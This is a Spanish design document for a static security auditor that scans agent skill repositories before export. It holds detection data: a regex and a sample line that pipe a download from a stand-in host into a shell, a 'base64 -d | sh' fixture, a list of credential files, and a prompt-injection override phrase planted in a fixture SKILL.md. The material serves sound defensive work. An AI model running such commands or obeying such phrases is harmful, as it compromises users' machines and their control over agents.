# Auditor de seguridad: qué puede hacer el paquete si lo instalas

**Fecha:** 2026-08-08
**Repositorio:** `novanoticia/claude-skills-exporter`
**Punto de partida:** `main` en `15d7144`
**Rebanada anterior:** [auditor de portabilidad](2026-08-08-auditor-portabilidad-diseno.md)
**Origen:** propuesta *«Auditor de portabilidad y seguridad»* (documento externo)

---

## 1. Qué problema resuelve

La herramienta clona repositorios ajenos y empaqueta su contenido para subirlo a plataformas
de terceros. Hoy no mira **nada** de lo que hay fuera de las carpetas de skill.

Comprobado sobre un repositorio construido para la ocasión, con un `scripts/setup.sh` que
hace `curl … | sh` y un `package.json` con un `postinstall` que hace lo mismo:

```
| `inocente` | 🟢 compatible | 🟢 compatible | 🟢 compatible | 🟢 compatible | 🟢 compatible |
```

Ni una mención de ninguno de los dos ficheros. La causa está en `discover_skills`: localiza
los directorios que contienen un `SKILL.md` y corta el descenso ahí (`dirnames[:] = []`).
Los manifiestos, los *lockfiles*, los scripts de la raíz, los binarios y la configuración de
CI son invisibles.

No es un fallo, es una diferencia de unidad: la unidad de análisis de la herramienta es la
**skill**, y la de la seguridad es el **paquete**. Esta rebanada añade la segunda sin
romper la primera.

## 2. Alcance

### Entra

- Recorrido propio del repositorio completo, con ámbito por hallazgo.
- Cuatro familias de reglas: permisos y acciones, cadena de suministro, ofuscación y
  conducta de prompt.
- Motor de riesgo: tres dimensiones, cinco niveles, escalada por combinación y
  recomendación de instalación.
- `bloqueo_seguridad` deja de ser un campo reservado y bloquea la exportación de los
  artefactos afectados.
- Informe y `resumen.json` 3.0 con el veredicto del paquete arriba.
- Nueve fixtures de seguridad con sus *golden files*, y dos guardas contra el exceso de celo.

### No entra

- **Juicio semántico.** La familia de conducta de prompt se limita a patrones **literales**.
  Reconocer una inyección reformulada corresponde a `github-plugin-analyzer-ia-v4`, según el
  reparto por régimen de verdad que se decidió en la rebanada anterior.
- Ejecutar, instalar o descomprimir nada. El análisis sigue siendo estrictamente estático y
  el CI lo comprueba por AST.
- Consultar bases de datos externas de vulnerabilidades. Las dependencias se auditan por lo
  que declaran, no por su CVE.
- Reputación del mantenedor, antigüedad del repositorio o cualquier señal social.

### Decisiones cerradas antes de diseñar

| Decisión | Elegido | Motivo |
|---|---|---|
| Unidad de análisis | El repositorio entero | El `postinstall` malicioso no pertenece a ninguna skill |
| Familias | Las cuatro, con conducta de prompt limitada a literales | Esta herramienta empaqueta skills que acaban dentro del agente de otra persona |
| Gate de `export` | Bloquea por lo que viaja; avisa por lo que no | Mismo principio que la portabilidad: no bloquear globalmente lo que sólo es cierto en un ámbito |
| Expresión de las reglas | Patrones en datos, estructura en código | Un patrón nuevo no toca Python; un analizador de manifiestos sí, y es honesto que así sea |
| Composición de salidas | Un informe que abre con el paquete, un JSON ampliado | La seguridad es la pregunta que nadie viene a hacer: debe salir sin pedirla |

## 3. Arquitectura

```
skills/plugin-to-agentskills/scripts/exporter/
├── seguridad/
│   ├── __init__.py
│   ├── _schema.json         schema de reglas.json
│   ├── reglas.json          patrones: id, familia, dimensión, severidad, confianza
│   ├── recorrido.py         walker del repositorio y asignación de ámbito
│   ├── patrones.py          aplica reglas.json sobre texto
│   ├── estructural.py       manifiestos, binarios, archivos, secretos
│   └── riesgo.py            hallazgos → dimensiones → nivel → recomendación
└── (los ocho módulos existentes, sin cambios de responsabilidad)
```

Los invariantes de la rebanada anterior siguen vigentes: Python 3.8+, sólo biblioteca
estándar en ejecución, `convert.py` en su ruta y arrancable por ruta absoluta desde una
copia en cualquier sitio, y `jsonschema` únicamente en CI.

## 4. El recorrido y el ámbito

`recorrido.py` arranca en la raíz del repositorio, no en `discover_skills`. Desciende por
todo salvo `.git` y `__pycache__` —el segundo no es contenido del paquete sino un artefacto
que genera el propio intérprete al arrancar la herramienta: comprobado sobre un checkout
limpio, el mero `import` de `exporter` escribe `.pyc` dentro del árbol que la herramienta va
a auditar, antes de que empiece el recorrido. Sin esta exclusión la herramienta se delataría
a sí misma en cada ejecución—. **No** salta `node_modules`, `dist` ni `build`: unas
dependencias versionadas en el repositorio son precisamente donde vive el riesgo de cadena de
suministro. (Sí quedan fuera de ámbito `exportado` cuando cuelgan de una skill: ver más abajo,
«El ámbito es el campo del que cuelga todo».)

Si eso hace el árbol inmanejable, los límites que ya impone `comprobar_tamano` —20 000
ficheros, 200 MB— abortan limpio antes de empezar. O cabe y se analiza, o se rechaza y se
dice; no hay tercera opción silenciosa.

No se siguen enlaces simbólicos. No se descomprime nada. No se ejecuta nada.

### El ámbito es el campo del que cuelga todo

| Ámbito | Definición | Consecuencia |
|---|---|---|
| `exportado` | El fichero acaba dentro del `.zip` o de la carpeta | **Bloquea** la escritura de ese artefacto |
| `paquete` | Vive en el repositorio pero no viaja al destino | Encabeza el informe; código de salida ≠ 0 |

Un hallazgo es de ámbito `exportado` si su fichero está dentro de un directorio de skill y
acaba en el artefacto: es decir, si no está en `IGNORED_DIRS` y no es un enlace simbólico
—que `copiar_skill` omite—.

**El `SKILL.md` cuenta como `exportado`.** Al empaquetar se le reescribe el frontmatter,
pero el cuerpo viaja íntegro, y es justo donde vive el riesgo de esta familia: una inyección
en las instrucciones llega entera al agente de destino. Sólo quedan fuera del ámbito las
claves de frontmatter que el conversor retira o baja a `metadata`.

**La documentación de una skill también es `exportado`, y eso restringe cómo se escribe.**
`references/`, y en general todo lo que cuelga de un directorio de skill sin estar en
`IGNORED_DIRS`, viaja dentro del artefacto. Un patrón grave escrito **en claro** ahí cumple
las tres condiciones del *gate* de la §7 —ámbito `exportado`, severidad alta, confianza al
menos media— y bloquea la exportación de la propia skill que lo documenta.

Esto afecta de lleno a este repositorio, cuya materia es precisamente describir patrones
peligrosos. La regla es: **en la documentación de una skill los patrones se describen con
palabras; los literales viven en `reglas.json` —que el motor se salta a sí mismo— y en
`tests/fixtures/`, que está fuera de toda skill.** No es una convención de estilo: sin ella
`plugin-to-agentskills.zip` deja de escribirse y `export` devuelve 3.

La consecuencia buscada es que la herramienta se aplique su propio criterio sin excepciones
cosméticas. Silenciar el caso en la prueba `EsteRepositorio` no serviría: esa lista sólo
afecta al test, no al *gate*, y el artefacto seguiría sin escribirse.

### Ficheros binarios

Un fichero cuyos primeros 8 KB contengan un byte nulo se trata como binario: no se le
aplican patrones, y se comprueba si algún fichero de texto del repositorio lo menciona por
nombre. Si no, produce `SEC-BINARIO-NO-DOCUMENTADO-001`.

## 5. Las reglas

### Patrones, en `reglas.json`

```json
{
  "schema_version": 1,
  "reglas": [
    {
      "id": "SEC-EXEC-REMOTO-001",
      "familia": "permisos_y_acciones",
      "dimension": "tecnico",
      "severidad": "alta",
      "confianza": "alta",
      "patron": "\\b(curl|wget)\\b[^|;\\n]{0,120}\\|\\s*(ba)?sh\\b",
      "titulo": "Descarga contenido remoto y lo ejecuta",
      "detalle": "Se descarga un script de la red y se pasa directamente al intérprete, sin verificar hash ni firma. Quien controle ese dominio controla lo que se ejecuta en tu máquina, hoy y en cualquier momento futuro.",
      "mitigacion": "Sustituirlo por una dependencia versionada con hash verificable.",
      "extensiones": [".sh", ".bash", ".zsh", ".md", ".yml", ".yaml", ".json", ".py"]
    }
  ]
}
```

Vocabularios cerrados, todos validados por el schema:

- **Familia:** `permisos_y_acciones` · `cadena_de_suministro` · `ofuscacion` ·
  `conducta_de_prompt`
- **Dimensión:** `tecnico` · `cadena_de_suministro` · `comportamiento`
- **Severidad:** `critica` · `alta` · `media` · `baja`
- **Confianza:** `alta` · `media` · `baja`

`confianza` existe por la misma razón que en los perfiles de destino. Un `curl | sh` no
admite lectura inocente: confianza alta. Sin ese campo, patrones de fiabilidad muy distinta
pesarían igual y el nivel de riesgo mentiría.

**Las tres reglas de `conducta_de_prompt` llevan `confianza: media`, no `alta` ni `baja`.**
El listón es más bajo aquí que en el resto de familias, y no por descuido: el `SKILL.md`
viaja **íntegro** al agente de destino, que lo lee como sus propias instrucciones — no como
un dato que procesa, sino como el texto que lo gobierna. Un patrón de inyección en ese fichero
no es una sospecha sobre lo que *podría* pasar si alguien ejecuta un script; es una frase que
el agente de destino *va a leer como orden* en cuanto la skill se instale. Por eso el §7 deja
bloquear a partir de confianza media, y no exige la alta que sí exige la escalada por
combinación del §6.

Esto tiene un coste explícito: un «ignora las instrucciones anteriores» dentro de un
`SKILL.md` puede estar ahí porque la skill *documenta* un ataque en vez de cometerlo, y con
confianza media eso bloquea la exportación igual que si lo cometiera. `--anular-revision-
seguridad` (§7) es la vía para ese caso: resuelve el bloqueo una vez y deja constancia escrita
en el informe. La alternativa —bajar estas tres reglas a confianza baja, que nunca bloquea—
dejaría salir sin aviso alguno una inyección real, y el coste de eso es mayor: un `SKILL.md`
malicioso no se limita a arriesgar la máquina de quien lo instala, gobierna directamente al
agente que lo lee.

La familia `conducta_de_prompt` lleva **sólo patrones literales**, y el informe lo declara:
*«cubre formulaciones conocidas; el juicio semántico corresponde a un auditor con
criterio»*.

### Estructura, en `estructural.py`

Lo que exige interpretar un fichero y no cabe en una expresión regular:

| Comprobación | Identificador | Severidad |
|---|---|---|
| `package.json` con `scripts.preinstall`, `install` o `postinstall` | `SEC-POSTINSTALL-001` | alta |
| Dependencia npm con `^`, `~`, `*`, `latest` o URL de git | `SEC-DEP-SIN-FIJAR-001` | media |
| `requirements.txt` o `pyproject.toml` con dependencia sin `==` | `SEC-DEP-SIN-FIJAR-002` | media |
| Binario sin mención en ningún fichero de texto | `SEC-BINARIO-NO-DOCUMENTADO-001` | media |
| `.zip`, `.tar`, `.tar.gz`, `.7z` dentro del repositorio | `SEC-ARCHIVO-ANIDADO-001` | media |
| `.env`, `id_rsa`, `id_ed25519`, `*.pem`, `*.p12`, `credentials.json` | `SEC-SECRETO-EN-REPO-001` | alta |

Los archivos comprimidos **se señalan y nunca se abren**. No conocer su contenido es
información: alimenta `no_evaluable`.

## 6. El motor de riesgo

### Nivel

Base: la peor severidad presente.

| Severidades presentes | Nivel |
|---|---|
| Ninguna, o sólo `baja` | `bajo` |
| Alguna `media` | `moderado` |
| Alguna `alta` | `alto` |
| Alguna `critica` | `critico` |

**Escalada por combinación.** Dos o más hallazgos de severidad `alta` en **dimensiones
distintas**, todos con `confianza: alta`, escalan el nivel a `critico`. Es la traducción
determinista de lo que la propuesta llama «se combinan de manera sospechosa»: un paquete que
descarga y ejecuta código remoto *y además* no fija ninguna versión es cualitativamente peor
que cualquiera de las dos cosas por separado. Exigir confianza alta impide que una
heurística dispare sola la escalada.

**`no_evaluable` no está en el mismo eje.** No significa «peor que moderado» sino «no puedo
saberlo». Se emite cuando hay contenido opaco —un archivo comprimido, un binario ilegible—
y **sustituye únicamente a `bajo`**. A partir de `moderado` inclusive, el nivel calculado se
mantiene y el contenido opaco pasa a ser una nota del informe: si se encontró algo, se
encontró, por mucho que el resto sea ilegible. La opacidad sólo decide el veredicto cuando
no hay ningún otro veredicto que dar.

### Dimensiones

Cada dimensión recibe su propio nivel, calculado con la misma regla base sobre los hallazgos
que la declaran. El informe las publica por separado porque responden a preguntas distintas:

| Dimensión | La pregunta |
|---|---|
| `tecnico` | ¿Qué puede hacer el paquete si se ejecuta? |
| `cadena_de_suministro` | ¿De dónde vienen sus dependencias, binarios y URLs? |
| `comportamiento` | ¿Las instrucciones piden permisos o datos que no corresponden a su finalidad declarada? |

### Recomendación de instalación

| Nivel | `recomendacion_instalacion` | Texto |
|---|---|---|
| `bajo` | `instalacion_razonable` | Instalación razonable tras leer el informe |
| `moderado` | `revisar_permisos` | Instalación posible con revisión de permisos |
| `alto` | `revision_humana_obligatoria` | No recomendar instalación automática; exigir revisión humana |
| `critico` | `bloqueada` | Bloquear la instalación y explicar los hallazgos |
| `no_evaluable` | `revision_incompleta` | No recomendar hasta completar la revisión |

### Cómo se redacta

Restricción de diseño, no de estilo: **nunca** «este repositorio es malicioso». Las
formulaciones permitidas son:

- «No se han detectado indicadores estáticos relevantes.»
- «Se han detectado operaciones de riesgo que requieren revisión.»
- «Se han detectado patrones incompatibles con el principio de mínimo privilegio.»
- «La instalación no puede recomendarse sin inspección humana.»
- «El contenido incluye patrones potencialmente maliciosos o altamente sospechosos.» —
  reservada a nivel `critico` con hallazgos de confianza alta.

## 7. El *gate*

`bloqueo_seguridad` deja de ser `null`. Pasa a `{regla_id, severidad, fichero, linea}`
cuando existe, en los ficheros de esa skill, un hallazgo que cumpla **las tres** condiciones:

- ámbito `exportado`,
- severidad `alta` o `critica`,
- **confianza `alta` o `media`**.

La tercera condición importa tanto como las otras dos. Un patrón de baja confianza puede
estar ahí por una razón legítima —una skill que *documenta* un ataque es el caso obvio— y
negarse a escribir el artefacto por una sospecha débil convierte el *gate* en un obstáculo
que la gente aprende a saltarse con `--anular-revision-seguridad` sin leer. Los hallazgos de
confianza baja avisan; nunca bloquean.

Cuando está presente:

- `export` **no escribe los artefactos de esa skill**. Las skills hermanas que estén limpias
  se exportan con normalidad.
- El código de salida es **3**, distinto del `2` de `--fail-on`.
- El informe encabeza la entrada de esa skill con el bloqueo y su motivo.

`--anular-revision-seguridad` escribe igualmente y estampa en el informe, en su propia
sección: *«Exportación realizada con anulación manual de advertencias de seguridad»*. La
anulación deja rastro en el artefacto, no sólo en la terminal.

El bloqueo es **por skill**, nunca global. Un `curl | sh` en la raíz del repositorio no
impide exportar unas skills que están limpias: sale en cabecera, devuelve código distinto de
cero y no bloquea nada. Es el mismo principio que rige la portabilidad — no bloquear
globalmente lo que sólo es cierto en un ámbito.

## 8. Las salidas

### Informe

```markdown
# Informe de portabilidad y seguridad

## Seguridad del paquete

**Nivel de riesgo:** alto
**Recomendación:** la instalación no puede recomendarse sin inspección humana.

| Dimensión | Nivel |
|---|---|
| Riesgo técnico | alto |
| Cadena de suministro | medio |
| Comportamiento | bajo |

### Hallazgos

1. 🔴 `SEC-EXEC-REMOTO-001` · `scripts/setup.sh:2` · ámbito: **paquete**
   Descarga contenido remoto y lo ejecuta sin verificar hash ni firma.
   *Mitigación:* sustituirlo por una dependencia versionada con hash verificable.
   *Confianza:* alta.

## Matriz de compatibilidad
   … con 🚫 en las celdas cuyo artefacto queda bloqueado
```

### `resumen.json` 3.0

Gana un bloque `seguridad` de nivel superior:

```json
{
  "report_version": "3.0",
  "origen": "./mi-plugin",
  "seguridad": {
    "nivel_riesgo": "alto",
    "recomendacion_instalacion": "revision_humana_obligatoria",
    "dimensiones": {
      "tecnico": "alto",
      "cadena_de_suministro": "moderado",
      "comportamiento": "bajo"
    },
    "escalada_por_combinacion": false,
    "hallazgos": [
      {
        "id": "SEC-EXEC-REMOTO-001",
        "familia": "permisos_y_acciones",
        "dimension": "tecnico",
        "severidad": "alta",
        "confianza": "alta",
        "ambito": "paquete",
        "ubicacion": "scripts/setup.sh:2",
        "muestra": "curl -s https://ejemplo.invalid/x.sh | sh",
        "titulo": "Descarga contenido remoto y lo ejecuta",
        "mitigacion": "Sustituirlo por una dependencia versionada con hash verificable."
      }
    ]
  },
  "skills": ["… sin cambios respecto a 2.0, salvo que bloqueo_seguridad ya puede no ser null"]
}
```

`resumen.schema.json` cambia `bloqueo_seguridad` de `{"type": "null"}` a un `oneOf` entre
`null` y el objeto de bloqueo, y añade el bloque `seguridad`. **Ése tiene que ser el primer
cambio de la implementación:** mientras el campo esté tipado `null`, cualquier bloqueo
emitido rompe el CI. Estaba puesto así a propósito.

Subir `report_version` cambia **todos** los *golden files*. No es un inconveniente: es el
mecanismo funcionando, y aparece como diff revisable en el pull request.

## 9. Fixtures y pruebas

### Fixtures

| Fixture | Qué prueba |
|---|---|
| `repo-descarga-remota` | `curl … \| sh` en la raíz → `alto`, ámbito `paquete`, no bloquea |
| `repo-postinstall` | Hook de `postinstall` y dependencias sin fijar |
| `repo-secreto` | `.env` e `id_rsa` falsos |
| `repo-ofuscado` | `base64 -d \| sh` |
| `repo-inyeccion-prompt` | `SKILL.md` con «ignora las instrucciones anteriores», ámbito `exportado` |
| `repo-binario` | Binario sin mención en ningún texto |
| `repo-red-legitima` | Uso de red documentado y coherente → **no debe escalar** |
| `repo-skill-maliciosa` | El `curl \| sh` está dentro de `skills/x/scripts/` → bloquea ese artefacto, código 3, y la skill hermana limpia sí se exporta |
| `repo-escalada` | Dos hallazgos altos en dimensiones distintas → escala a `critico` |

### La prueba central

**El mismo patrón en `scripts/setup.sh` y en `skills/x/scripts/run.sh` debe producir ámbitos
distintos y comportamientos distintos del *gate*.** Si esa prueba falla, la decisión de
ámbito no está implementada por mucho que el resto pase en verde.

### Dos guardas contra el exceso de celo

1. **Todo hallazgo sobre este repositorio tiene que ser trazable a material de prueba.**
   Comprobado antes de escribir esto: hoy el repositorio **no** contiene `curl | sh` ni
   frases de inyección; `deteccion.py` sólo cita cuatro literales de sus propias expresiones
   regulares. Pero después de esta rebanada sí los contendrá, y en abundancia: `reglas.json`
   es un fichero lleno de los patrones que el motor caza, y los fixtures de la §9 llevan
   `curl | sh` de verdad.

   Por eso la guarda **no** puede ser «no superar `moderado`»: sería pedirle al motor que
   mienta sobre lo que tiene delante. Lo que se exige es más preciso y más útil: al
   ejecutarlo sobre este repositorio, **ningún hallazgo debe proceder de la skill que se
   publica en `skills/plugin-to-agentskills/`**, salvo dos excepciones declaradas y
   comentadas en la prueba —el catálogo `seguridad/reglas.json`, que `patrones.analizar`
   excluye por definición, y el `subprocess.run` del `git clone` en `convert.py`, el único
   proceso externo del programa, ya auditado por AST—. Los hallazgos en `docs/` (que
   documenta los patrones) y en `tests/fixtures/` (que los reproduce) son esperados y no
   cuentan como falso positivo: sólo cuenta lo que sale de la skill publicada. Si el motor
   delata la skill real fuera de esas dos excepciones, hay un falso positivo; si delata su
   propio banco de pruebas o su propia documentación, está funcionando.
2. **Los fixtures deben ser inertes.** Dominios en `.invalid` —el TLD que reserva la
   RFC 2606 y que no resuelve nunca— y claves manifiestamente falsas, con una prueba que lo
   verifica. GitHub pasa un escáner de secretos sobre los repositorios públicos: un fixture
   con algo que *parezca* una credencial real levantaría una alerta en este repositorio.

### Capas

- Unidad por módulo: `recorrido`, `patrones`, `estructural`, `riesgo`.
- *Golden files* por fixture de seguridad, con la fecha fijada por `CSE_FECHA`.
- Gate: artefactos ausentes para la skill bloqueada, presentes para la hermana limpia,
  código 3, y `--anular-revision-seguridad` escribiendo **y** estampando el informe.

## 10. CI

Se añade al workflow, conservando todo lo que ya hace:

- Validación de `reglas.json` contra `seguridad/_schema.json`.
- Compilación de cada `patron` como expresión regular.
- **Cobertura de reglas por fixtures:** cada regla de `reglas.json` debe ser disparada por al
  menos un fixture. Una regla que nadie sabe demostrar es una regla que nadie ha probado, y
  en un motor que crece por acumulación de patrones eso se pudre rápido.
- La comprobación por AST de que el análisis sigue siendo estático, ya existente.

## 11. Criterios de aceptación

1. El repositorio de la §1 —`curl | sh` en `scripts/setup.sh` y `postinstall` en
   `package.json`— produce nivel `alto` como mínimo, con ambos ficheros citados por
   `fichero:línea`.
2. Ese mismo repositorio **sí** exporta sus skills limpias, con código de salida distinto de
   cero y el aviso en cabecera.
3. `repo-skill-maliciosa` no escribe los artefactos de la skill afectada, sí los de la
   hermana limpia, y sale con código 3.
4. `--anular-revision-seguridad` escribe los artefactos y deja la constancia escrita en el
   informe.
5. `repo-red-legitima` no supera `moderado`.
6. Al ejecutar la herramienta sobre este mismo repositorio, ningún hallazgo procede de
   `skills/plugin-to-agentskills/` salvo dos excepciones declaradas y comentadas en la
   prueba: el catálogo `seguridad/reglas.json` —que `patrones.analizar` excluye— y el
   `subprocess.run` del `git clone` en `convert.py`, que el paso de CI «El análisis sigue
   siendo estático» ya audita por AST. Los hallazgos en `docs/` y en `tests/` son esperados:
   ahí es donde se documentan y se reproducen los patrones.
7. `repo-escalada` alcanza `critico` por combinación, y el informe nombra las dos
   dimensiones implicadas.
8. Ningún hallazgo aparece sin `fichero:línea`, mitigación y confianza.
9. Ningún nivel de riesgo aparece sin los hallazgos que lo justifican.
10. `resumen.json` valida contra su schema y es idéntico entre dos ejecuciones a fecha fija.
11. Cada regla de `reglas.json` es disparada por al menos un fixture.
12. El análisis no ejecuta, no instala y no descomprime nada; el único proceso externo del
    programa sigue siendo `git clone`.

## 12. Riesgos

| Riesgo | Mitigación |
|---|---|
| Falsos positivos que hagan ignorar los avisos | `confianza` por regla, `repo-red-legitima` y la autoevaluación de este repositorio como pruebas negativas |
| La familia de conducta de prompt promete más de lo que da | Sólo literales, y el informe declara su límite en cada ejecución |
| El recorrido completo hace inviable un monorepo | Los límites de 20 000 ficheros y 200 MB abortan limpio, con mensaje |
| El *gate* bloquea exportaciones legítimas | El bloqueo es por skill y sólo por ámbito `exportado`; la anulación existe y deja rastro |
| Las reglas crecen sin prueba que las respalde | El CI exige un fixture por regla |
| Un fixture dispara el escáner de secretos de GitHub | Dominios `.invalid`, claves falsas y una prueba que lo verifica |

## 13. Lo que queda fuera y para después

El juicio semántico sobre las instrucciones —inyecciones reformuladas, redefinición
encubierta de la finalidad, coerción— pertenece a `github-plugin-analyzer-ia-v4`, que puede
consumir el `seguridad` de `resumen.json` como punto de partida determinista. Esta rebanada
le entrega hallazgos con identificador, ubicación y confianza; v4 aporta el criterio que
ningún patrón puede aportar.
